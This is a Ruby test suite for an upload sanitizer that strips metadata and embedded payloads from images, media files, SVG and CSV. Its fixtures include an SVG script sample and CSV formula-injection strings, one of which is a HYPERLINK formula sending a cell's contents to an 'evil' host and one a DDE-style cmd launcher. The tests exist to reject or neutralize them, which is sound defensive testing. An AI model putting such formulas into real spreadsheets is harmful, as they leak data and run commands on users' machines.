# frozen_string_literal: true

require 'test_helper'
require 'minitest/mock'
require 'sample_virus_malware'

class SanitizeTest < Minitest::Test
  include FixtureBuilder

  S = SampleVirusMalware
  POLICY = UploadInspector::Policy.new(allowed_types: S::IMAGES)

  def walk(type, bytes)
    blocks = []
    UploadInspector::ImageInspector.new(POLICY).verify!(write_file('w', bytes), type) { |*block| blocks << block }
    blocks
  end

  # Rewriters copy blocks byte for byte, so the walker must account for every byte, in order.
  def test_image_walker_blocks_tile_the_file
    { 'image/png' => S.png, 'image/jpeg' => S.jpeg + S.jpeg, 'image/gif' => S.gif, 'image/webp' => S.webp }.each do |type, bytes|
      blocks = walk(type, bytes)
      position = 0
      blocks.each do |_, offset, length|
        assert_equal position, offset, "#{type} gap before #{blocks.inspect}"
        position += length
      end
      assert_equal bytes.bytesize, position, type
    end
  end

  def test_image_walker_block_kinds
    assert_equal [:signature, 'IHDR', 'IDAT', 'IEND'], walk('image/png', S.png).map(&:first)
    assert_equal [0xD8, 0xE0, 0xC0, 0xDA, :scan_data, 0xD9], walk('image/jpeg', S.jpeg).map(&:first)
    assert_equal %i[header image trailer], walk('image/gif', S.gif).map(&:first)
    assert_equal [:riff, 'VP8L'], walk('image/webp', S.webp).map(&:first)
  end

  # --- images ------------------------------------------------------------------------

  P = S::INERT_SCRIPT

  # Sanitizes +bytes+ named +name+; returns [result, output bytes or nil when nothing was written].
  def sanitize(bytes, name, allowed_types: S::IMAGES, sandbox: false, **options)
    to = tmp_path("clean-#{name}")
    result = UploadInspector.sanitize(write_file(name, bytes), filename: name, to:, sandbox:, allowed_types:, **options)
    [result, File.exist?(to) ? File.binread(to) : nil]
  end

  def assert_clean(result, output, name)
    assert result.safe?, "#{result.reason}: #{result.detail}"
    assert_equal tmp_path("clean-#{name}"), result.sanitized_path
    refute_includes output, P
    checked = UploadInspector.check(write_file("recheck-#{name}", output), filename: name, sandbox: false,
                                                                           allowed_types: S::IMAGES)
    assert checked.safe?, "#{checked.reason}: #{checked.detail}"
  end

  # Smallest structurally valid ICC profile: 128-byte header with the acsp signature, no tags.
  ICC = ([132].pack('N') + ("\0" * 32) + 'acsp' + ("\0" * 88) + [0].pack('N')).b.freeze
  FAKE_ICC = "#{P}#{"\0" * 128}".b.freeze # stored where a profile belongs, but not one

  def png_iccp(profile) = S.png_chunk('iCCP', "p\0\0#{Zlib::Deflate.deflate(profile)}")
  def jpeg_icc(profile) = jpeg_segment(0xE2, "ICC_PROFILE\0\x01\x01#{profile}")

  def sub_blocks(data) = data.b.bytes.each_slice(255).map { |slice| [slice.size, *slice].pack('C*') }.join + "\0".b

  def test_png_keeps_image_chunks_and_drops_text_and_unknown_chunks
    idat = Zlib::Deflate.deflate("\0\0\0\0")
    head = S.png.byteslice(0, 33) # signature + IHDR
    iccp = png_iccp(ICC)
    bytes = head + S.png_chunk('tEXt', "Comment\0#{P}") + S.png_chunk('zTXt', "c\0\0#{Zlib::Deflate.deflate(P)}") + iccp +
            S.png_chunk('IDAT', idat.byteslice(0, 5)) + S.png_chunk('IDAT', idat.byteslice(5..)) +
            S.png_chunk('eXIf', P) + S.png_chunk('prVt', P) + S.png_chunk('IEND', '')
    result, output = sanitize(bytes, 'a.png')

    assert_clean(result, output, 'a.png')
    assert_equal head + iccp + S.png_chunk('IDAT', idat) + S.png_chunk('IEND', ''), output # IDATs merged, fresh CRC
  end

  def jpeg_segment(marker, payload) = [0xFF, marker, payload.bytesize + 2].pack('CCn') + payload.b

  # Little-endian EXIF: Orientation 6 and a GPS IFD pointer, followed by the payload.
  def exif(orientation = 6)
    tiff = "II*\0".b + [8, 2].pack('Vv') + [0x0112, 3, 1, orientation, 0].pack('vvVvv') + [0x8825, 4, 1, 38].pack('vvVV') +
           [0].pack('V') + P
    jpeg_segment(0xE1, "Exif\0\0#{tiff}")
  end

  def hostile_jpeg
    jpeg = S.jpeg
    app0 = jpeg.byteslice(0, 20) # SOI + APP0 JFIF
    rest = jpeg.byteslice(20..)
    second = S.jpeg.sub("\xFF\xC0".b, jpeg_segment(0xFE, P) + "\xFF\xC0".b) # MPF image carrying the payload
    [app0 + exif + jpeg_segment(0xFE, P) + jpeg_segment(0xED, P) + jpeg_segment(0xE2, "MPF\0#{P}") + "\xFF\xFF".b + rest + second,
     app0, rest]
  end

  def test_jpeg_drops_exif_comments_other_app_segments_and_extra_images
    bytes, app0, rest = hostile_jpeg
    result, output = sanitize(bytes, 'a.jpg')

    assert_clean(result, output, 'a.jpg')
    assert_equal app0 + rest, output
  end

  def test_jpeg_keep_orientation_writes_a_minimal_exif
    bytes, app0, rest = hostile_jpeg
    result, output = sanitize(bytes, 'a.jpg', keep_orientation: true)

    assert_clean(result, output, 'a.jpg')
    exif = jpeg_segment(0xE1, "Exif\0\0MM\0*".b + [8, 1, 0x0112, 3, 1, 6, 0, 0].pack('NnnnNnnN'))
    assert_equal app0 + exif + rest, output
  end

  def test_jpeg_keeps_icc_profile_and_adobe_segments
    icc = jpeg_icc(ICC)
    adobe = jpeg_segment(0xEE, "Adobe\0\x64\0\0\0\0\x01")
    jpeg = S.jpeg
    bytes = jpeg.byteslice(0, 20) + icc + adobe + jpeg.byteslice(20..)
    result, output = sanitize(bytes, 'a.jpg')

    assert result.safe?
    assert_equal bytes, output
  end

  def test_jpeg_without_orientation_writes_no_exif
    jpeg = S.jpeg
    _, output = sanitize(jpeg.byteslice(0, 20) + jpeg_segment(0xE1, "Exif\0\0MM\0*\0\0\0\x08\0\0") + jpeg.byteslice(20..), 'a.jpg',
                         keep_orientation: true)
    assert_equal jpeg, output
  end

  def test_gif_keeps_frame_control_and_loop_and_drops_other_extensions
    gif = S.gif
    header = gif.byteslice(0, 19) # signature, screen descriptor, 2-color global table
    control = "\x21\xF9\x04\x00\x0A\x00\x00\x00".b
    loop_count = "\x21\xFF\x0BNETSCAPE2.0\x03\x01\x00\x00\x00".b
    bytes = header + "\x21\xFE".b + sub_blocks(P) + control + loop_count +
            "\x21\xFF\x0BNETSCAPE2.0\x03\x01\x00\x00".b + sub_blocks(P) + # loop extension with extra data
            "\x21\xFF\x0BXMP DataXMP".b + sub_blocks(P) + "\x21\x01\x0C#{"\0" * 12}".b + sub_blocks(P) + gif.byteslice(19..)
    result, output = sanitize(bytes, 'a.gif')

    assert_clean(result, output, 'a.gif')
    assert_equal header + control + loop_count + gif.byteslice(19..), output
  end

  def webp_chunk(fourcc, data)
    chunk = fourcc.b + [data.bytesize].pack('V') + data.b
    data.bytesize.odd? ? chunk + "\0".b : chunk
  end

  def riff(*chunks)
    body = chunks.join
    'RIFF'.b + [body.bytesize + 4].pack('V') + 'WEBP'.b + body
  end

  def test_webp_drops_metadata_chunks_and_fixes_the_header
    vp8l = webp_chunk('VP8L', "\x2F\0\0\0\0\0")
    iccp = webp_chunk('ICCP', ICC)
    vp8x = ->(flags) { webp_chunk('VP8X', [flags].pack('C') + ("\0" * 9)) } # 1x1 canvas
    bytes = riff(vp8x[0x2C], iccp, vp8l, webp_chunk('EXIF', P), webp_chunk('XMP ', P), webp_chunk('ABCD', P))
    result, output = sanitize(bytes, 'a.webp')

    assert_clean(result, output, 'a.webp')
    assert_equal riff(vp8x[0x20], iccp, vp8l), output
  end

  # --- HEIC / AVIF / MP4 / QuickTime --------------------------------------------------

  def sanitize_media(bytes, name) = sanitize(bytes, name, allowed_types: S::MEDIA)

  def test_media_drops_trailing_boxes
    clean = S.mp4
    result, output = sanitize_media(clean + S.box('free', zip_bytes('a.pdf' => clean_pdf)) + S.box('uuid', "\0" * 16 + P), 'a.mp4')

    assert result.safe?, result.detail
    assert_equal clean, output
  end

  # Boxes before mdat cannot move: chunk offsets in moov are absolute.
  def test_media_zero_fills_boxes_that_other_boxes_follow
    ftyp = S.ftyp('isom', 'mp41')
    moov = S.box('moov', S.track(1, 1))
    mdat = S.box('mdat', "\0" * 16)
    padding = S.box('free', P)
    result, output = sanitize_media(ftyp + moov + padding + S.box('skip', P) + mdat, 'a.mp4')

    assert result.safe?, result.detail
    refute_includes output, P
    assert_equal ftyp + moov + S.box('free', "\0" * P.bytesize) * 2 + mdat, output
  end

  def test_media_keeps_the_64_bit_size_form_of_a_zero_filled_box
    large_free = [1].pack('N') + 'free'.b + [16 + P.bytesize].pack('Q>') + P
    _, output = sanitize_media(S.ftyp('heic', 'mif1') + large_free + S.heif.byteslice(S.ftyp('heic', 'mif1').bytesize..), 'a.heic')

    assert_includes output, [1].pack('N') + 'free'.b + [16 + P.bytesize].pack('Q>') + ("\0" * P.bytesize)
    refute_includes output, P
  end

  def zero_free(payload) = S.box('free', "\0" * payload.bytesize)

  # Phone videos keep their GPS location in moov/udta (©xyz) or moov/meta.
  def test_media_zero_fills_movie_and_track_metadata
    tkhd = S.full_box('tkhd', ("\0" * 72) + [1 << 16, 1 << 16].pack('NN'))
    location = S.box('\xA9xyz'.b, P)
    movie = lambda do |track_udta, udta, meta|
      S.ftyp('isom', 'mp41') + S.box('moov', S.box('trak', tkhd + track_udta) + udta + meta) + S.box('mdat', "\0" * 16)
    end
    result, output = sanitize_media(movie[S.box('udta', P), S.box('udta', location), S.box('meta', P)], 'a.mp4')

    assert result.safe?, result.detail
    assert_equal movie[zero_free(P), zero_free(location), zero_free(P)], output
  end

  # HEIF with an image item (1) and an Exif item (2), both stored in mdat (iloc version 0).
  def heif_with_exif(exif_type: 'Exif')
    infe = ->(id, type) { S.box('infe', [2, 0, 0, id, 0].pack('CCnnn') + type + "\0") } # FullBox v2, name ""
    build = lambda do |mdat_at|
      iinf = S.full_box('iinf', [2].pack('n') + infe[1, 'hvc1'] + infe[2, exif_type])
      iloc = S.full_box('iloc', [0x4400, 2, 1, 0, 1, mdat_at, 4, 2, 0, 1, mdat_at + 4, P.bytesize].pack('nnnnnNNnnnNN'))
      ispe = S.full_box('ispe', [1, 1].pack('NN'))
      S.ftyp('heic', 'mif1') + S.full_box('meta', iinf + iloc + S.box('iprp', S.box('ipco', ispe))) + S.box('mdat', "\x01\x02\x03\x04#{P}")
    end
    mdat_at = build[0].bytesize - 4 - P.bytesize # payload of the last box
    build[mdat_at]
  end

  def test_media_zeroes_exif_items_of_an_image
    bytes = heif_with_exif
    result, output = sanitize_media(bytes, 'a.heic')

    assert result.safe?, result.detail
    expected = bytes.sub(P, "\0" * P.bytesize).sub("\x00\x02\x00\x00Exif".b, "\x00\x02\x00\x00skip".b)
    assert_equal expected, output
    assert_includes output, "\x00\x01\x00\x00hvc1\0".b # the image item is untouched
  end

  # Exif item stored in meta/idat (iloc version 1, construction method 1) or by item reference (method 2).
  def heif_with_exif_in_idat(method)
    infe = S.box('infe', [2, 0, 0, 2, 0].pack('CCnnn') + "Exif\0")
    iloc = S.box('iloc', [1, 0, 0, 0x4400, 1, 2, method, 0, 1, 4, P.bytesize].pack('CCnnnnnnnNN'))
    meta = S.full_box('meta', S.full_box('iinf', [1].pack('n') + infe) + iloc + S.box('idat', "abcd#{P}") +
                              S.box('iprp', S.box('ipco', S.full_box('ispe', [1, 1].pack('NN')))))
    S.ftyp('heic', 'mif1') + meta + S.box('mdat', '')
  end

  def test_media_zeroes_exif_items_stored_in_idat
    result, output = sanitize_media(heif_with_exif_in_idat(1), 'a.heic')

    assert result.safe?, result.detail
    assert_includes output, S.box('idat', "abcd#{"\0" * P.bytesize}")
  end

  def test_media_with_exif_items_located_by_reference_is_unsupported
    result, output = sanitize_media(heif_with_exif_in_idat(2), 'a.heic')

    assert_equal :sanitize_unsupported, result.reason
    assert_nil output
  end

  # Extents that consume no iloc bytes would let a tiny box loop billions of times.
  def test_media_rejects_iloc_extents_without_size
    infe = S.box('infe', [2, 0, 0, 2, 0].pack('CCnnn') + "Exif\0")
    iloc = S.full_box('iloc', [0x0000, 1, 2, 0, 0xFFFF].pack('nnnnn'))
    meta = S.full_box('meta', S.full_box('iinf', [1].pack('n') + infe) + iloc +
                              S.box('iprp', S.box('ipco', S.full_box('ispe', [1, 1].pack('NN')))))
    result, output = sanitize_media(S.ftyp('heic', 'mif1') + meta + S.box('mdat', ''), 'a.heic')

    assert_equal [:media_malformed, 'iloc extent size'], [result.reason, result.detail]
    assert_nil output
  end

  def test_media_rejects_idat_extents_past_idat
    bytes = heif_with_exif_in_idat(1).sub([4, P.bytesize].pack('NN'), [4, P.bytesize + 9].pack('NN')) # into iprp
    result, = sanitize_media(bytes, 'a.heic')
    assert_equal [:media_malformed, 'metadata item outside its data'], [result.reason, result.detail]
  end

  def test_media_zeroes_repeated_extents_once
    rewriter = UploadInspector::Sanitizers::IsoBmffRewriter.new(nil)
    assert_equal [[0, 10], [20, 5]], rewriter.send(:merge, [[20, 5], [0, 10], [0, 10], [5, 3], [10, 0], [22, 1]])
  end

  def test_media_without_metadata_items_is_copied
    bytes = heif_with_exif(exif_type: 'hvc1')
    assert_equal bytes, sanitize_media(bytes, 'a.heic').last
  end

  # Needs libvips with libheif encoders (Debian/Ubuntu: libheif-plugin-x265, libheif-plugin-aomenc).
  def test_real_heic_and_avif_decode_after_sanitizing
    skip 'libvips not installed' unless system('vips --version', out: File::NULL, err: File::NULL)

    encoded = %w[heic avif].select do |ext|
      source = tmp_path("real.#{ext}")
      compression = ext == 'heic' ? 'hevc' : 'av1'
      next false unless system('vips', 'black', "#{source}[compression=#{compression}]", '16', '8', out: File::NULL, err: File::NULL)

      bytes = File.binread(source)
      result, output = sanitize_media(bytes + S.box('free', P), "real.#{ext}")
      assert result.safe?, "#{ext}: #{result.reason} #{result.detail}"
      assert_equal bytes.bytesize, output.bytesize, ext # trailing free box dropped, the rest zeroed in place
      refute_includes output, P, ext
      refute_includes output, "Exif\0\0".b, ext # libvips writes an Exif item: zeroed
      assert_equal "16\n", IO.popen(['vipsheader', '-f', 'width', result.sanitized_path], err: File::NULL, &:read), ext
    end
    skip 'libheif has no HEVC or AV1 encoder' if encoded.empty?
  end

  # --- SVG ---------------------------------------------------------------------------

  SVG = 'image/svg+xml'

  def sanitize_svg(svg) = sanitize(svg, 'a.svg', allowed_types: [SVG])

  def test_svg_is_rebuilt_from_allowlisted_elements_and_attributes
    svg = <<~SVG
      <?xml version="1.0"?>
      <!-- #{P} -->
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:x="urn:x" viewBox="0 0 10 10" data-p="1" x:a="b">
        <metadata><rdf>#{P.sub('<', '&lt;')}</rdf></metadata>
        <title>Logo &amp; &#x41;</title>
        <foo><rect width="1"/></foo>
        <style><![CDATA[rect > .a { fill: red }]]></style>
        <rect width="10" height="10" fill="red" unknown="1">
          <animate attributeName="opacity" from="1" to="0" dur="1s"/>
          <set attributeName="style" to="fill:blue"/>
          <set attributeName="data-p" to="1"/>
          <set to="1"/>
        </rect>
        <desc>#{P.sub('<', '&lt;')}</desc>
      </svg>
    SVG
    result, output = sanitize_svg(svg)

    assert result.safe?, result.detail
    assert_equal <<~SVG.chomp, output
      <?xml version="1.0" encoding="UTF-8"?>
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10">
        
        <title>Logo &amp; A</title>
        
        <style>rect &gt; .a { fill: red }</style>
        <rect width="10" height="10" fill="red">
          <animate attributeName="opacity" from="1" to="0" dur="1s"/>
          
          
          
        </rect>
        <desc>&lt;?php echo 'inert sample'; ?&gt;</desc>
      </svg>
    SVG
    refute_includes output, P
  end

  def test_svg_keeps_links_inside_the_document_and_animation_paths
    svg = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="p" d="M0 0L9 9"/></defs>' \
          '<use xlink:href="#p"/><circle r="1"><animateMotion dur="2s"><mpath href="#p"/></animateMotion></circle>' \
          '<a href="https://example.com/"><text x="1" y="2" xml:space="preserve">a&#10;b</text></a></svg>'
    result, output = sanitize_svg(svg)

    assert result.safe?, result.detail
    assert_equal ['https://example.com/'], result.links
    assert_equal %(<?xml version="1.0" encoding="UTF-8"?>\n#{svg.sub(' xmlns:xlink="http://www.w3.org/1999/xlink"', '')
                                                              .sub('<svg xmlns="http://www.w3.org/2000/svg"',
                                                                   '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"')
                                                              .sub('a&#10;b', "a\nb")}), output
  end

  def test_svg_in_latin1_comes_out_as_utf8
    _, output = sanitize_svg(%(<?xml version="1.0" encoding="ISO-8859-1"?><svg xmlns="http://www.w3.org/2000/svg"><title>caf\xE9</title></svg>).b)

    assert_includes output.force_encoding(Encoding::UTF_8), '<title>café</title>'
  end

  def test_hostile_svg_is_still_rejected_and_writes_nothing
    result, output = sanitize_svg('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')

    assert_equal :svg_active_content, result.reason
    assert_nil output
  end

  def test_real_svg_renders_after_sanitizing
    skip 'libvips not installed' unless system('vips --version', out: File::NULL, err: File::NULL)

    svg = %(<svg xmlns="http://www.w3.org/2000/svg" width="16" height="8"><!-- #{P} --><metadata>x</metadata>) +
          '<linearGradient id="g"><stop offset="0" stop-color="red"/></linearGradient><rect width="16" height="8" fill="url(#g)"/></svg>'
    result, = sanitize_svg(svg)

    assert result.safe?, result.detail
    assert_equal "16\n", IO.popen(['vipsheader', '-f', 'width', result.sanitized_path], err: File::NULL, &:read)
  end

  # --- text / CSV ----------------------------------------------------------------------

  TEXT = %w[text/plain text/csv text/tab-separated-values].freeze

  def sanitize_text(text, name, **options) = sanitize(text, name, allowed_types: TEXT, **options)

  def test_text_is_copied_unchanged
    text = "\xEF\xBB\xBFname,total\nAda,-5\n".b
    result, output = sanitize_text(text, 'a.csv')

    assert result.safe?, result.detail
    assert_equal text, output
  end

  def test_csv_formulas_are_rejected_unless_neutralized
    csv = %(name,link\nAda,=HYPERLINK("http://evil/?"&A1)\n)

    assert_equal :csv_formula, sanitize_text(csv, 'a.csv').first.reason
  end

  def test_csv_formulas_are_neutralized_on_request
    csv = %(name,link,phone,n\n=SUM(1),"=HYPERLINK(""http://evil"")",+1 (555) 010,-5\n@cmd|' /C calc'!A0;\t -2+3*cmd|x\n)
    result, output = sanitize_text(csv, 'a.csv', neutralize_csv_formulas: true)

    assert result.safe?, result.detail
    assert_equal %(name,link,phone,n\n'=SUM(1),"'=HYPERLINK(""http://evil"")",+1 (555) 010,-5\n'@cmd|' /C calc'!A0;\t '-2+3*cmd|x\n), output
  end

  # Quoting a quoted cell exposes the cells inside it to the output check.
  def test_csv_formulas_inside_quoted_cells_are_neutralized_too
    result, output = sanitize_text(%("=A(1),=B(2)",x\n), 'a.csv', neutralize_csv_formulas: true)

    assert result.safe?, result.detail
    assert_equal %("'=A(1),'=B(2)",x\n), output
  end

  def test_text_markup_is_still_rejected
    assert_equal :text_markup, sanitize_text("<script>x</script>\n", 'a.txt', neutralize_csv_formulas: true).first.reason
  end

  # --- reencode (libvips) --------------------------------------------------------------

  def require_vips
    UploadInspector::Sanitizers::VipsReencoder.require_vips!
  rescue ArgumentError
    skip 'ruby-vips / libvips not installed (bundle config set --local with vips)'
  end

  def test_reencode_without_vips_raises_a_clear_error
    raise_load_error = ->(_) { raise LoadError, 'cannot load such file -- vips' }
    UploadInspector::Sanitizers::VipsReencoder.stub(:require, raise_load_error) do
      error = assert_raises(ArgumentError) { sanitize(S.png, 'a.png', reencode: true) }
      assert_match(/ruby-vips/, error.message)
    end
  end

  def test_reencode_writes_new_images_without_the_payload
    require_vips
    skip 'ImageMagick not installed' unless system('convert -version', out: File::NULL, err: File::NULL)

    %w[png jpg gif webp].each do |ext|
      source = tmp_path("real.#{ext}")
      assert system('convert', '-size', '16x8', 'gradient:red-blue', '-set', 'comment', P, source, err: File::NULL), ext
      bytes = File.binread(source)
      bytes = with_webp_exif(bytes, 16, 8) if ext == 'webp'
      result, output = sanitize(bytes, "real.#{ext}", reencode: true, sandbox: ext == 'png')

      assert result.safe?, "#{ext}: #{result.reason} #{result.detail}"
      refute_includes output, P, ext
      refute_equal bytes, output, ext
      assert_equal "16x8\n", IO.popen(['identify', '-format', '%wx%h\n', result.sanitized_path], err: File::NULL, &:read), ext
    end
  end

  # Orientation 6 (rotate 90 degrees clockwise) applied to the pixels: 16x8 becomes 8x16.
  def test_reencode_with_keep_orientation_rotates_the_pixels
    require_vips
    skip 'ImageMagick not installed' unless system('convert -version', out: File::NULL, err: File::NULL)

    source = tmp_path('rotated.jpg')
    assert system('convert', '-size', '16x8', 'gradient:red-blue', source, err: File::NULL)
    real = File.binread(source)
    result, = sanitize(real.byteslice(0, 20) + exif(6) + real.byteslice(20..), 'rotated.jpg', reencode: true, keep_orientation: true)

    assert result.safe?, result.detail
    assert_equal '8x16', IO.popen(['identify', '-format', '%wx%h', result.sanitized_path], err: File::NULL, &:read)
  end

  # Each frame is within the limit, all frames together are not.
  def test_reencode_limits_the_pixels_of_all_frames
    require_vips
    skip 'ImageMagick not installed' unless system('convert -version', out: File::NULL, err: File::NULL)

    source = tmp_path('frames.gif')
    assert system('convert', '-size', '10x10', 'xc:red', 'xc:blue', 'xc:green', source, err: File::NULL)
    result, output = sanitize(File.binread(source), 'frames.gif', reencode: true, max_image_pixels: 250)

    assert_equal :image_too_many_pixels, result.reason
    assert_nil output
    assert sanitize(File.binread(source), 'frames.gif', reencode: true, max_image_pixels: 300).first.safe?
  end

  def test_reencode_leaves_svg_to_the_rewriter
    require_vips
    result, output = sanitize('<svg xmlns="http://www.w3.org/2000/svg"><!-- x --></svg>', 'a.svg', allowed_types: [SVG], reencode: true)

    assert result.safe?, result.detail
    refute_includes output, '<!--'
  end

  def test_invalid_color_profiles_are_dropped
    png = S.png
    _, output = sanitize(png.byteslice(0, 33) + png_iccp(FAKE_ICC) + png.byteslice(33..), 'a.png')
    assert_equal png, output

    jpeg = S.jpeg
    _, output = sanitize(jpeg.byteslice(0, 20) + jpeg_icc(FAKE_ICC) + jpeg.byteslice(20..), 'a.jpg')
    assert_equal jpeg, output

    vp8l = webp_chunk('VP8L', "\x2F\0\0\0\0\0")
    vp8x = ->(flags) { webp_chunk('VP8X', [flags].pack('C') + ("\0" * 9)) }
    _, output = sanitize(riff(vp8x[0x20], webp_chunk('ICCP', FAKE_ICC), vp8l), 'a.webp')
    assert_equal riff(vp8x[0], vp8l), output # ICC flag cleared
  end

  # A JPEG profile split over APP2 segments is checked once reassembled in sequence order.
  def test_jpeg_icc_profile_split_over_segments
    jpeg = S.jpeg
    parts = [jpeg_segment(0xE2, "ICC_PROFILE\0\x02\x02#{ICC.byteslice(60..)}"),
             jpeg_segment(0xE2, "ICC_PROFILE\0\x01\x02#{ICC.byteslice(0, 60)}")]
    bytes = jpeg.byteslice(0, 20) + parts.join + jpeg.byteslice(20..)
    assert_equal bytes, sanitize(bytes, 'a.jpg').last
  end

  # Segments are not buffered past the profile size limit, and the profile is dropped.
  def test_jpeg_icc_segments_over_the_size_limit_are_dropped
    jpeg = S.jpeg
    filler = jpeg_segment(0xE2, "ICC_PROFILE\0\x01\x01#{"\0" * 65_000}")
    bytes = jpeg.byteslice(0, 20) + jpeg_icc(ICC) + (filler * 17) + jpeg.byteslice(20..) # > 1 MB
    assert_equal jpeg, sanitize(bytes, 'a.jpg').last
  end

  def test_real_color_profiles_are_kept
    skip 'libvips not installed' unless system('vips --version', out: File::NULL, err: File::NULL)
    skip 'ImageMagick not installed' unless system('convert -version', out: File::NULL, err: File::NULL)

    %w[png jpg webp].each do |ext|
      plain = tmp_path("plain-#{ext}.png")
      source = tmp_path("icc.#{ext}")
      assert system('vips', 'black', plain, '16', '8', '--bands', '3', out: File::NULL, err: File::NULL)
      assert system('vips', 'icc_transform', plain, source, 'srgb', '--input-profile', 'srgb', out: File::NULL, err: File::NULL), ext
      result, = sanitize(File.binread(source), "icc.#{ext}")

      assert result.safe?, "#{ext}: #{result.reason} #{result.detail}"
      assert_equal 'sRGB', IO.popen(['identify', '-format', '%[profile:icc]', result.sanitized_path], err: File::NULL, &:read), ext
    end
  end

  def test_unsafe_upload_writes_nothing
    result, output = sanitize(S.png + P, 'a.png')

    assert_equal :image_trailing_data, result.reason
    assert_nil result.sanitized_path
    assert_nil output
  end

  def test_type_without_a_rewriter_is_rejected_and_writes_nothing
    result, output = sanitize(clean_pdf, 'a.pdf', allowed_types: ['application/pdf'])

    assert_equal :sanitize_unsupported, result.reason
    assert_equal 'cannot be cleaned', result.message.delete_prefix('is a file type that ')
    assert_nil output
  end

  def test_sanitize_runs_in_the_sandbox
    bytes, app0, rest = hostile_jpeg
    result, output = sanitize(bytes, 'a.jpg', sandbox: true)

    assert result.safe?, result.detail
    assert_equal app0 + rest, output
  end

  def test_sanitize_rejects_unknown_options
    assert_raises(ArgumentError) { sanitize(S.png, 'a.png', mode: :report) }
  end

  # Extended WebP: VP8X declaring EXIF, the original image chunks, then an EXIF chunk.
  def with_webp_exif(simple, width, height)
    canvas = [width - 1].pack('V').byteslice(0, 3) + [height - 1].pack('V').byteslice(0, 3)
    riff(webp_chunk('VP8X', "\x08\0\0\0".b + canvas), simple.byteslice(12..), webp_chunk('EXIF', P))
  end

  # Real encoders and decoders: the cleaned file must still open (skipped without ImageMagick/libvips).
  def test_real_images_still_decode_after_sanitizing
    skip 'ImageMagick not installed' unless system('convert -version', out: File::NULL, err: File::NULL)

    %w[png jpg gif webp].each do |ext|
      source = tmp_path("real.#{ext}")
      assert system('convert', '-size', '16x8', 'gradient:red-blue', '-set', 'comment', P, source, err: File::NULL), ext
      bytes = File.binread(source)
      bytes = with_webp_exif(bytes, 16, 8) if ext == 'webp' # ImageMagick writes no WebP metadata
      assert_includes bytes, P, ext
      result, output = sanitize(bytes, "real.#{ext}")
      assert result.safe?, "#{ext}: #{result.reason} #{result.detail}"
      refute_includes output, P, ext
      assert_equal "16x8\n", IO.popen(['identify', '-format', '%wx%h\n', result.sanitized_path], err: File::NULL, &:read), ext
      next unless system('vips --version', out: File::NULL, err: File::NULL)

      assert system('vips', 'copy', result.sanitized_path, tmp_path("decoded-#{ext}.v"), out: File::NULL, err: File::NULL), ext
    end
  end

  def test_real_jpeg_keeps_its_orientation
    skip 'ImageMagick not installed' unless system('convert -version', out: File::NULL, err: File::NULL)

    source = tmp_path('rotated.jpg')
    assert system('convert', '-size', '16x8', 'gradient:red-blue', source, err: File::NULL)
    real = File.binread(source)
    result, output = sanitize(real.byteslice(0, 20) + exif(6) + real.byteslice(20..), 'rotated.jpg', keep_orientation: true)

    assert result.safe?, result.detail
    refute_includes output, P
    assert_equal 'RightTop', IO.popen(['identify', '-format', '%[orientation]', result.sanitized_path], err: File::NULL, &:read)
  end
end
